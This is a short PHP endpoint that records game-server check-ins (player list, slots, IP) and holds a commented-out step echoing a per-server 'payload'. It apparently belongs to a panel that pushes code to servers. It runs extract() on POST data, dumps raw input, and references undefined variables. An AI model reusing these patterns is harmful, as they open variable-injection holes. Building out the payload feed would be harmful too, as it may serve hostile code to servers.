<?php
//header('content-type:application/json');

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

echo "Payloads : \n";

var_dump($_POST);


extract($_POST);

if (!isset($playerlist) || empty($playerlist)) {
    echo json_encode(['success' => false, 'error' => "the field playerlist is needed"]);
    exit;
}

if (!isset($used_slots) || empty($used_slots)) {
    echo json_encode(['success' => false, 'error' => "the field used_slots is needed"]);
    exit;
}

if (!isset($server_ip) || empty($server_ip)) {
    echo json_encode(['success' => false, 'error' => "the field server_ip is needed"]);
    exit;
}

if (!isset($csrf_token) || empty($csrf_token)) {
    echo json_encode(['success' => false, 'error' => "the field csrf_token is needed"]);
    exit;
}

$playerlist = json_decode($playerlist);
if (json_last_error() !== JSON_ERROR_NONE) {
    echo json_encode(['success' => false, 'error' => "the field playerlist have invalid syntax"]);
    exit;
}


require_once '../../../app/Models/includes.php';

$ipPortSplited = explode(":", $server_ip);

if ($ipPortSplited[0] != CSRF::GetVisitorIP()) {
    echo json_encode(['success' => false, 'error' => "address ip do not match"]);
    exit;
}

if (!preg_match('/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\:?([0-9]{1,5})?/', $server_ip, $match)) {
    echo json_encode(['success' => false, 'error' => "address ip and port is invalid"]);
    exit;
}

if (!Server::ServerExistByIP($server_ip)) {
    echo json_encode(['success' => false, 'error' => "this server does not exist actuelly please wait..."]);
    exit;
}

$GLOBALS['DB']->Update(
    "servers",
    [
        'ip' => $ip
    ],
    [
        'used_slots' => $nbplayer,
        'playerlist' => $playerlist,
        'last_update' => time()
    ],
    false
);

// $server_data = Server::GetServerByIP($ip);

// $payload_data = Payload::ReadPayloadToServerID($server_data['id']);

// if (!empty($payload_data)) {
// 	$replaced_payload = str_replace("{{discord_invite}}", "https://discord.gg/MrJUbQ72kj", $payload_data['content']);
// 	echo $replaced_payload;
// }